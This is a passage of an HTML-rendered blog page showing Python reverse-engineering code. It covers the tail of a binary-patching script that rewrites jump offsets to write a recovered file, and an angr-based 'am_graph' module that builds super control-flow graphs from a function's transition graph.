fill_jmp_offset(origin_data, file_offset + <span class="number">2</span>, childs[<span class="number">0</span>] - instr.address - <span class="number">6</span>)</span><br><span class="line">            file_offset += <span class="number">6</span></span><br><span class="line">            patch_byte(origin_data, file_offset, opcode[<span class="string">&#x27;jmp&#x27;</span>])</span><br><span class="line">            fill_jmp_offset(origin_data, file_offset + <span class="number">1</span>, childs[<span class="number">1</span>] - (instr.address + <span class="number">6</span>) - <span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(origin_data) == origin_data_len, <span class="string">&quot;Error: size of data changed!!!&quot;</span></span><br><span class="line">    recovery.write(origin_data)</span><br><span class="line">    recovery.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Successful! The recovered file: %s&#x27;</span> % recovery_file)</span><br></pre></td></tr></table></figure></li><li><p>am_graph</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> networkx</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> angr.knowledge_plugins <span class="keyword">import</span> Function</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">grouper</span>(<span class="params">iterable, n, fillvalue=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;Collect data into fixed-length chunks or blocks&quot;</span></span><br><span class="line">    args = [<span class="built_in">iter</span>(iterable)] * n</span><br><span class="line">    <span class="keyword">return</span> itertools.izip_longest(*args, fillvalue=fillvalue)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_supergraph</span>(<span class="params">transition_graph</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Convert transition graph of a function to a super transition graph. A super transition graph is a graph that looks</span></span><br><span class="line"><span class="string">    like IDA Pro&#x27;s CFG, where calls to returning functions do not terminate basic blocks.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param networkx.DiGraph transition_graph: The transition graph.</span></span><br><span class="line"><span class="string">    :return: A converted super transition graph</span></span><br><span class="line"><span class="string">    :rtype networkx.DiGraph</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># make a copy of the graph</span></span><br><span class="line">    transition_graph = networkx.DiGraph(transition_graph)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># remove all edges that transitions to outside</span></span><br><span class="line">    <span class="keyword">for</span> src, dst, data <span class="keyword">in</span> <span class="built_in">list</span>(transition_graph.edges(data=<span class="literal">True</span>)):</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;type&#x27;</span>] <span class="keyword">in</span> (<span class="string">&#x27;transition&#x27;</span>, <span class="string">&#x27;exception&#x27;</span>) <span class="keyword">and</span> data.get(<span class="string">&#x27;outside&#x27;</span>, <span class="literal">False</span>) <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            transition_graph.remove_edge(src, dst)</span><br><span class="line">        <span class="keyword">if</span> transition_graph.in_degree(dst) == <span class="number">0</span>:</span><br><span class="line">            transition_graph.remove_node(dst)</span><br><span class="line"></span><br><span class="line">    edges_to_shrink = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Find all edges to remove in the super graph</span></span><br><span class="line">    <span class="keyword">for</span> src <span class="keyword">in</span> transition_graph.nodes():</span><br><span class="line">        edges = transition_graph[src]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># there are two types of edges we want to remove:</span></span><br><span class="line">        <span class="comment"># - call or fakerets, since we do not want blocks to break at calls</span></span><br><span class="line">        <span class="comment"># - boring jumps that directly transfer the control to the block immediately after the current block. this is</span></span><br><span class="line">        <span class="comment">#   usually caused by how VEX breaks down basic blocks, which happens very often in MIPS</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(edges) == <span class="number">1</span> <span class="keyword">and</span> src.addr + src.size == <span class="built_in">next</span>(<span class="built_in">iter</span>(edges.keys())).addr:</span><br><span class="line">            dst = <span class="built_in">next</span>(<span class="built_in">iter</span>(edges.keys()))</span><br><span class="line">            dst_in_edges = transition_graph.in_edges(dst)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(dst_in_edges) == <span class="number">1</span>:</span><br><span class="line">                edges_to_shrink.add((src, dst))</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(<span class="built_in">iter</span>(<span class="string">&#x27;type&#x27;</span> <span class="keyword">in</span> data <span class="keyword">and</span> data[<span class="string">&#x27;type&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;fake_return&#x27;</span>, <span class="string">&#x27;call&#x27;</span>) <span class="keyword">for</span> data <span class="keyword">in</span> edges.values())):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> dst, data <span class="keyword">in</span> edges.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(dst, Function):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;type&#x27;</span> <span class="keyword">in</span> data <span class="keyword">and</span> data[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;fake_return&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">all</span>(<span class="built_in">iter</span>(<span class="string">&#x27;type&#x27;</span> <span class="keyword">in</span> data <span class="keyword">and</span> data[<span class="string">&#x27;type&#x27;</span>] <span class="keyword">in</span> (<span class="string">&#x27;fake_return&#x27;</span>, <span class="string">&#x27;return_from_call&#x27;</span>)</span><br><span class="line">                            <span class="keyword">for</span> _, _, data <span class="keyword">in</span> transition_graph.in_edges(dst, data=<span class="literal">True</span>))):</span><br><span class="line">                    edges_to_shrink.add((src, dst))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create the super graph</span></span><br><span class="line">    super_graph = networkx.DiGraph()</span><br><span class="line"></span><br><span class="line">    supernodes_map = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function_nodes = <span class="built_in">set</span>()  <span class="comment"># it will be traversed after all other nodes are added into the supergraph</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> transition_graph.nodes():</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, Function):</span><br><span class="line">            function_nodes.add(node)</span><br><span class="line">            <span class="comment"># don&#x27;t put functions into the supergraph</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        dests_and_data = transition_graph[node]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># make a super node</span></span><br><span class="line">        <span class="keyword">if</span> node <span class="keyword">in</span> supernodes_map:</span><br><span class="line">            src_supernode = supernodes_map[node]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            src_supernode = SuperCFGNode.from_cfgnode(node)</span><br><span class="line">            supernodes_map[node] = src_supernode</span><br><span class="line">            <span class="comment"># insert it into the graph</span></span><br><span class="line">            super_graph.add_node(src_supernode)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> dests_and_data:</span><br><span class="line">            <span class="comment"># might be an isolated node</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Take src_supernode off the graph since we might modify it</span></span><br><span class="line">        <span class="keyword">if</span> src_supernode <span class="keyword">in</span> super_graph:</span><br><span class="line">            existing_in_edges = <span class="built_in">list</span>(super_graph.in_edges(src_supernode, data=<span class="literal">True</span>))</span><br><span class="line">            existing_out_edges = <span class="built_in">list</span>(super_graph.out_edges(src_supernode, data=<span class="literal">True</span>))</span><br><span class="line">            super_graph.remove_node(src_supernode)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            existing_in_edges = [ ]</span><br><span class="line">            existing_out_edges = [ ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> dst, data <span class="keyword">in</span> dests_and_data.items():</span><br><span class="line"></span><br><span class="line">            edge = (node, dst)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> edge <span class="keyword">in</span> edges_to_shrink:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> dst <span class="keyword">in</span> supernodes_map:</span><br><span class="line">                    dst_supernode = supernodes_map[dst]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    dst_supernode = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">                src_supernode.insert_cfgnode(dst)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># update supernodes map</span></span><br><span class="line">                supernodes_map[dst] = src_supernode</span><br><span class="line"></span><br><span class="line">                <span class="comment"># merge the other supernode</span></span><br><span class="line">                <span class="keyword">if</span> dst_supernode <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    src_supernode.merge(dst_supernode)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> src <span class="keyword">in</span> dst_supernode.cfg_nodes:</span><br><span class="line">                        supernodes_map[src] = src_supernode</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># link all out edges of dst_supernode to src_supernode</span></span><br><span class="line">                    <span class="keyword">for</span> dst_, data_ <span class="keyword">in</span> super_graph[dst_supernode].items():</span><br><span class="line">                        super_graph.add_edge(src_supernode, dst_, **data_)</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># link all in edges of dst_supernode to src_supernode</span></span><br><span class="line">                    <span class="keyword">for</span> src_, _, data_ <span class="keyword">in</span> super_graph.in_edges(dst_supernode, data=<span class="literal">True</span>):</span><br><span class="line">                        super_graph.add_edge(src_, src_supernode, **data_)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> <span class="string">&#x27;type&#x27;</span> <span class="keyword">in</span> data_ <span class="keyword">and</span> data_[<span class="string">&#x27;type&#x27;</span>] <span class="keyword">in</span> (<span class="string">&#x27;transition&#x27;</span>, <span class="string">&#x27;exception&#x27;</span>):</span><br><span class="line">                            <span class="keyword">if</span> <span class="keyword">not</span> (<span class="string">&#x27;ins_addr&#x27;</span> <span class="keyword">in</span> data_ <span class="keyword">and</span> <span class="string">&#x27;stmt_idx&#x27;</span> <span class="keyword">in</span> data_):</span><br><span class="line">                                <span class="comment"># this is a hack to work around the issue in Function.normalize() where ins_addr and</span></span><br><span class="line">                                <span class="comment"># stmt_idx weren&#x27;t properly set onto edges</span></span><br><span class="line">                                <span class="keyword">continue</span></span><br><span class="line">                            src_supernode.register_out_branch(data_[<span class="string">&#x27;ins_addr&#x27;</span>], data_[<span class="string">&#x27;stmt_idx&#x27;</span>], data_[<span class="string">&#x27;type&#x27;</span>],</span><br><span class="line">                                                              dst_supernode.addr</span><br><span class="line">                                                              )</span><br><span class="line"></span><br><span class="line">                    super_graph.remove_node(dst_supernode)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(dst, Function):</span><br><span class="line">                    <span class="comment"># skip all functions</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># make a super node</span></span><br><span class="line">                <span class="keyword">if</span> dst <span class="keyword">in</span> supernodes_map:</span><br><span class="line">                    dst_supernode = supernodes_map[dst]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    dst_supernode = SuperCFGNode.from_cfgnode(dst)</span><br><span class="line">                    supernodes_map[dst] = dst_supernode</span><br><span class="line"></span><br><span class="line">                super_graph.add_edge(src_supernode, dst_supernode, **data)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;type&#x27;</span> <span class="keyword">in</span> data <span class="keyword">and</span> data[<span class="string">&#x27;type&#x27;</span>] <span class="keyword">in</span> (<span class="string">&#x27;transition&#x27;</span>, <span class="string">&#x27;exception&#x27;</span>):</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="string">&#x27;ins_addr&#x27;</span> <span class="keyword">in</span> data <span class="keyword">and</span> <span class="string">&#x27;stmt_idx&#x27;</span> <span class="keyword">in</span> data):</span><br><span class="line">                        <span class="comment"># this is a hack to work around the issue in Function.normalize() where ins_addr and</span></span><br><span class="line">                        <span class="comment"># stmt_idx weren&#x27;t properly set onto edges</span></span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    src_supernode.register_out_branch(data[<span class="string">&#x27;ins_addr&#x27;</span>], data[<span class="string">&#x27;stmt_idx&#x27;</span>], data[<span class="string">&#x27;type&#x27;</span>],</span><br><span class="line">                                                      dst_supernode.addr</span><br><span class="line">                                                      )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># add back the node (in case there are no edges)</span></span><br><span class="line">        super_graph.add_node(src_supernode)</span><br><span class="line">        <span class="comment"># add back the old edges</span></span><br><span class="line">        <span class="keyword">for</span> src, _, data <span class="keyword">in</span> existing_in_edges:</span><br><span class="line">            super_graph.add_edge(src, src_supernode, **data)</span><br><span class="line">        <span class="keyword">for</span> _, dst, data <span class="keyword">in</span> existing_out_edges:</span><br><span class="line">            super_graph.add_edge(src_supernode, dst, **data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> function_nodes:</span><br><span class="line">        in_edges = transition_graph.in_edges(node, data=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> src, _, data <span class="keyword">in</span> in_edges:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (<span class="string">&#x27;ins_addr&#x27;</span> <span class="keyword">in</span> data <span class="keyword">and</span> <span class="string">&#x27;stmt_idx&#x27;</span> <span class="keyword">in</span> data):</span><br><span class="line">                <span class="comment"># this is a hack to work around the issue in Function.normalize() where ins_addr and</span></span><br><span class="line">                <span class="comment"># stmt_idx weren&#x27;t properly set onto edges</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            supernode = supernodes_map[src]</span><br><span class="line">            supernode.register_out_branch(data[<span class="string">&#x27;ins_addr&#x27;</span>], data[<span class="string">&#x27;stmt_idx&#x27;</span>], data[<span class="string">&#x27;type&#x27;</span>], node.addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> super_graph</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OutBranch</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, ins_addr, stmt_idx, branch_type</span>):</span><br><span class="line">        self.ins_addr = ins_addr</span><br><span class="line">        self.stmt_idx = stmt_idx</span><br><span class="line">        self.<span class="built_in">type</span> = branch_type</span><br><span class="line"></span><br><span class="line">        self.targets = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.ins_addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;OutBranch at None, type %s&gt;&quot;</span> % self.<span class="built_in">type</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;OutBranch at %#x, type %s&gt;&quot;</span> % (self.ins_addr, self.<span class="built_in">type</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_target</span>(<span class="params">self, addr</span>):</span><br><span class="line">        self.targets.add(addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Merge with the other OutBranch descriptor.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param OutBranch other: The other item to merge with.</span></span><br><span class="line"><span class="string">        :return: None</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> self.ins_addr == other.ins_addr</span><br><span class="line">        <span class="keyword">assert</span> self.<span class="built_in">type</span> == other.<span class="built_in">type</span></span><br><span class="line"></span><br><span class="line">        o = self.copy()</span><br><span class="line">        o.targets |= other.targets</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> o</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">copy</span>(<span class="params">self</span>):</span><br><span class="line">        o = OutBranch(self.ins_addr, self.stmt_idx, self.<span class="built_in">type</span>)</span><br><span class="line">        o.targets = self.targets.copy()</span><br><span class="line">        <span class="keyword">return</span> o</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(other, OutBranch):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.ins_addr == other.ins_addr <span class="keyword">and</span> \</span><br><span class="line">               self.stmt_idx == other.stmt_idx <span class="keyword">and</span> \</span><br><span class="line">               self.<span class="built_in">type</span> == other.<span class="built_in">type</span> <span class="keyword">and</span> \</span><br><span class="line">               self.targets == other.targets</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hash</span>((self.ins_addr, self.stmt_idx, self.<span class="built_in">type</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SuperCFGNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, addr</span>):</span><br><span class="line">        self.addr = addr</span><br><span class="line"></span><br><span class="line">        self.cfg_nodes = [ ]</span><br><span class="line"></span><br><span class="line">        self.out_branches = defaultdict(<span class="built_in">dict</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span>(node.size <span class="keyword">for</span> node <span class="keyword">in</span> self.cfg_nodes)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">from_cfgnode</span>(<span class="params">cls, cfg_node</span>):</span><br><span class="line">        s = cls(cfg_node.addr)</span><br><span class="line"></span><br><span class="line">        s.cfg_nodes.append(cfg_node)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insert_cfgnode</span>(<span class="params">self, cfg_node</span>):</span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> Make it binary search/insertion</span></span><br><span class="line">        <span class="keyword">for</span> i, n <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.cfg_nodes):</span><br><span class="line">            <span class="keyword">if</span> cfg_node.addr &lt; n.addr:</span><br><span class="line">                <span class="comment"># insert before n</span></span><br><span class="line">                self.cfg_nodes.insert(i, cfg_node)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> cfg_node.addr == n.addr:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.cfg_nodes.append(cfg_node)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># update addr</span></span><br><span class="line">        self.addr = self.cfg_nodes[<span class="number">0</span>].addr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">register_out_branch</span>(<span class="params">self, ins_addr, stmt_idx, branch_type, target_addr</span>):</span><br><span class="line">        <span class="keyword">if</span> ins_addr <span class="keyword">not</span> <span class="keyword">in</span> self.out_branches <span class="keyword">or</span> stmt_idx <span class="keyword">not</span> <span class="keyword">in</span> self.out_branches[ins_addr]:</span><br><span class="line">            self.out_branches[ins_addr][stmt_idx] = OutBranch(ins_addr, stmt_idx, branch_type)</span><br><span class="line"></span><br><span class="line">        self.out_branches[ins_addr][stmt_idx].add_target(target_addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Merge another supernode into the current one.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param SuperCFGNode other: The supernode to merge with.</span></span><br><span class="line"><span class="string">        :return: None</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> other.cfg_nodes:</span><br><span class="line">            self.insert_cfgnode(n)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ins_addr, outs <span class="keyword">in</span> other.out_branches.items():</span><br><span class="line">            <span class="keyword">if</span> ins_addr <span class="keyword">in</span> self.out_branches:</span><br><span class="line">                <span class="keyword">for</span> stmt_idx, item <span class="keyword">in</span> outs.items():</span><br><span class="line">                    <span class="keyword">if</span> stmt_idx <span class="keyword">in</span> self.out_branches[ins_addr]:</span><br><span class="line">                        self.out_branches[ins_addr][stmt_idx].merge(item)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        self.out_branches[ins_addr][stmt_idx] = item</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                item = <span class="built_in">next</span>(<span class="built_in">iter</span>(outs.values()))</span><br><span class="line">                self.out_branches[ins_addr][item.stmt_idx] = item</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;SuperCFGNode %#08x, %d blocks, %d out branches&gt;&quot;</span> % (self.addr, <span class="built_in">len</span>(self.cfg_nodes),</span><br><span class="line">                                                                     <span class="built_in">len</span>(self.out_branches)</span><br><span class="line">                                                                     )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hash</span>((<span class="string">&#x27;supercfgnode&#x27;</span>, self.addr))</span><br><span 